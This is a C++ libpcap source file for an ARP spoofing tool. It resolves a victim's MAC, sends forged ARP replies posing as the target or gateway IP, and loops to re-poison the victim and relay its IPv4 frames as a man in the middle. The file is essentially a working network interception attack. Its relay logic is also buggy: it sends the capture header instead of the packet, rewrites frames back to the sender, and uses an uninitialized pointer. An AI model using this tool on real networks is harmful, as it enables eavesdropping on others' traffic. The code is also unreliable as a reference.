#include "main.h"


/*********************************/
void usage();

EthArpPacket *createArpPacket(EthArpPacket *p,
						Mac dmac,
						Mac smac,
						uint16_t op, 
						Ip sip, 
						Mac tmac,
						Ip tip);

Mac getSenderMac(pcap_t* handle, 
				Ip dip, 
				Ip sip, 
				Mac smac);

Mac arpInfection(pcap_t* handle, EthArpPacket *packet, Mac myMac, Ip myIp, Ip senderIp, Ip targetIp);

bool isArp(EthHdr *ethhdr);

void arpSpoofing(pcap_t* handle, EthArpPacket *_packet, Mac myMac, Mac senderMac,  Ip myIp, Ip senderIp, Ip targetIp);

/*********************************/

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket *packet;
	Mac myMac = Mac(get_mac_address());
	Mac senderMac;
	Ip myIp = Ip(get_ip_address(argv[1]));
	Ip senderIp = Ip(argv[2]);
	Ip targetIp = Ip(argv[3]);

	senderMac = arpInfection(handle, packet, myMac, myIp, senderIp, targetIp);
	arpSpoofing(handle, packet, myMac, senderMac, myIp, senderIp, targetIp);

	delete packet;

	pcap_close(handle);
}

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp-test wlan0 10.1.1.2 10.1.1.3 \n");
}

EthArpPacket *createArpPacket(EthArpPacket *p,
						Mac dmac,
						Mac smac,
						uint16_t op, 
						Ip sip, 
						Mac tmac,
						Ip tip) {
	if(p != NULL){
		delete p;
		p = NULL;
	}
	EthArpPacket *packet = new EthArpPacket;

	packet->eth_.dmac_ = dmac;
	packet->eth_.smac_ = smac;
	packet->eth_.type_ = htons(EthHdr::Arp);
	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	packet->arp_.op_ = htons(op);
	packet->arp_.smac_ = smac;
	packet->arp_.sip_ = htonl(sip);
	packet->arp_.tmac_ = tmac;
	packet->arp_.tip_ = htonl(tip);

	return packet;
}

Mac getSenderMac(pcap_t* handle, Ip dip, Ip sip, Mac smac){
	while(true){
		struct pcap_pkthdr* pkthdr;
		const u_char* packet;
        int res = pcap_next_ex(handle, &pkthdr, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthArpPacket* etharp = (struct EthArpPacket*)packet;
		if(etharp->eth_.type_ != htons(EthHdr::Arp)
		|| etharp->arp_.op_ != htons(ArpHdr::Reply)
		|| etharp->arp_.sip_ != htonl(dip))
			continue; 
		return etharp->eth_.smac();
	}
	return 0; 
}

Mac arpInfection(pcap_t* handle, EthArpPacket *packet, Mac myMac, Ip myIp, Ip senderIp, Ip targetIp){
	packet = createArpPacket(packet,
						Mac("ff:ff:ff:ff:ff:ff"),
						myMac,
						ArpHdr::Request,
						myIp, //MyIP
						Mac("00:00:00:00:00:00"),
						senderIp); //victim - sender

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	Mac senderMac = getSenderMac(handle, senderIp, myIp, myMac);

	packet = createArpPacket(packet,
						senderMac,
						myMac,
						ArpHdr::Reply,
						targetIp, // gate
						senderMac,
						senderIp); //victim - sender

	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return senderMac;
}

bool isArp(EthHdr *ethhdr){
	if(ethhdr->type()==EthHdr::Arp)
		return true;
	else 
		return false;
}

void arpSpoofing(pcap_t* handle, EthArpPacket *_packet, Mac myMac, Mac senderMac, Ip myIp, Ip senderIp, Ip targetIp){
	while(true){
		struct pcap_pkthdr* pkthdr;
		const u_char* packet;
		int res = pcap_next_ex(handle, &pkthdr, &packet);

		EthHdr *ethhdr = (EthHdr *)packet;

		if(!isArp(ethhdr)){ 
			if(ethhdr->smac_ != senderMac) 
				continue;
			

			if(ethhdr->type() == EthHdr::Ip4)
			{
				ethhdr->dmac_ = senderMac;
				ethhdr->smac_ = myMac;
				
				res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pkthdr), pkthdr->len);
				res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pkthdr), pkthdr->caplen);
			}
		}
		else{ //re-infection
			arpInfection(handle, _packet, myMac, myIp, senderIp, targetIp);
		}


	}
}

/*
          if(spoof_Packet->smac() != mac_pair[i].first)
                continue;
            // spoof_Packet dst mac != my mac
            if(spoof_Packet->dmac() != my_Mac)
                continue;
            // spoof_Packet type == tcp
            if(spoof_Packet->type() == EthHdr::Ip4)
            {
                // dst mac -> target MAC
                spoof_Packet->dmac_ = mac_pair[i].second;
                // src mac -> my MAC
                spoof_Packet->smac_ = my_Mac;

*/
